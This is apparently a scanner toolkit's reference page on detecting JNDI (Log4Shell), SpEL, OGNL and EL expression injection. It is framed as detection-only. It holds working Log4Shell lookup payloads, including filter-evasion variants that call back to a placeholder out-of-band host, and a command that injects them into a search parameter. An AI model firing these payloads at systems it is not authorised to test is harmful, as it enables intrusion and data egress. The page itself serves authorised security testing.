# JNDI / SpEL / OGNL / EL — expression-injection detection reference

> **Detection-only.** Nothing here executes a command. JNDI detection uses **our own OOB
> listener** (`tools/oob.js`) as the only allowed callback; SpEL/OGNL/EL detection uses a
> deterministic math marker. Escalation to code execution needs explicit in-session approval.

These are the "expression injection" families that sit next to SSTI but have their own
parsers, their own error signatures and their own CVE history (Log4Shell being the loudest).
They appear in headers, log lines, search fields, sort/order parameters and message templates
— places a template scanner never looks.

## 1. JNDI injection (Log4Shell family, CVE-2021-44228 and successors)

Start the listener, mint a marker, then inject the **marker only**:

```
node tools/oob.js listen          # in a second shell
node tools/oob.js marker          # prints a unique marker to embed
```

Payload forms, in increasing order of filter evasion (all still just a callback):

```
${jndi:ldap://<marker>.oob/}
${jndi:dns://<marker>.oob}
${${lower:j}ndi:${lower:l}dap://<marker>.oob/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://<marker>.oob/a}
```

Where to put them — anything that gets logged: `User-Agent`, `X-Forwarded-For`,
`X-Api-Version`, `Referer`, a search box, a username field, a `sort`/`order` parameter, an
error message that echoes the input.

```
node tools/repeater.js --url "<url>/search?q=FUZZ" --vary "q=\${jndi:ldap://<marker>.oob/a}"
node tools/oob.js hits            # DNS or LDAP hit = the value was interpolated
```

Interpretation:
- **DNS hit** → the string reached a JNDI lookup (`triggered`). It does not by itself prove
  code execution: modern JDKs and `com.sun.jndi.ldap.object.trustURLCodebase=false` block the
  remote class load. Read the JDK version before claiming more.
- **No hit** but the app echoes the literal string → reflection only, not injection.
- **No hit** and the field is logged asynchronously → wait, re-check `hits`; log pipelines
  deliver late.

Version check (the cheapest proof): `log4j-core` 2.0–2.14.1 in the SBOM/lockfile →
`suspected`/`triggered` even without a hit. 2.15.0–2.16.0 has the JNDI lookup disabled by
default but other issues; 2.17.1+ is the fixed line.

Never point a `jndi:` payload at a host you do not control, and never at a public
callback service: the target's resolver would become an egress channel and the OPSEC rule
(no data leaving the machine) is broken by design.

## 2. SpEL / OGNL / EL — math marker

| Context | Probe | Expected |
|---|---|---|
| Spring SpEL (`${…}`, `#{…}`) | `${7*7}` / `#{7*7}` | `49` in the rendered output |
| Struts OGNL (`%{…}`, `*{…}`) | `%{7*7}` / `*{7*7}` | `49` |
| JSP EL (`${…}`) | `${7*7}` | `49` |
| Thymeleaf (Spring) | `${7*7}` inside a template attribute | `49` |
| Freemarker / Velocity | see `ssti.md` | `49` |

A result of `49` in the **rendered** page (not in the raw request echo) is the confirmation.
An error naming the parser (`SpelEvaluationException`, `OgnlException`,
`jakarta.el.ELException`, `ognl.NoSuchPropertyException`) is a strong engine fingerprint even
when the expression is blocked.

## 3. WAF-aware ordering

If the first probe is blocked (`403`, generic error page, WAF challenge), retry **once** with
an equivalent form before concluding anything:

- SpEL: `${7 * 7}`, `${T(java.lang.Math).abs(-49)}` (class access is a *stronger* signal —
  if it evaluates, stop and report, do not go further);
- OGNL: `%{7*7}`, `%{(7*7)}`;
- EL: `${7 div 1 * 7}`;
- JNDI: the `${lower:…}`/`${env:…}` forms above.

Do not build a bypass ladder: three probes per parameter is the budget, and every extra
request is noise plus rate-limit risk.

## 4. Record

| Observation | Class | verify_level |
|---|---|---|
| OOB DNS/LDAP hit from a `jndi:` payload | `injection` | triggered |
| affected `log4j-core` in the SBOM, no hit | `supply-chain` (or `injection` if a sink is known) | suspected |
| math marker evaluated (`49` rendered) | `ssti` | triggered |
| expression evaluated with class access / method call | `ssti` | triggered; `exploited` only with an approved read-only PoC |

`cwe`: CWE-917 (expression language injection), CWE-502 for deserialization-adjacent JNDI,
CWE-1336 for template injection. Evidence must include the exact parameter, the payload, the
marker, and the listener timestamp — a JNDI finding without the hit log is not reproducible.
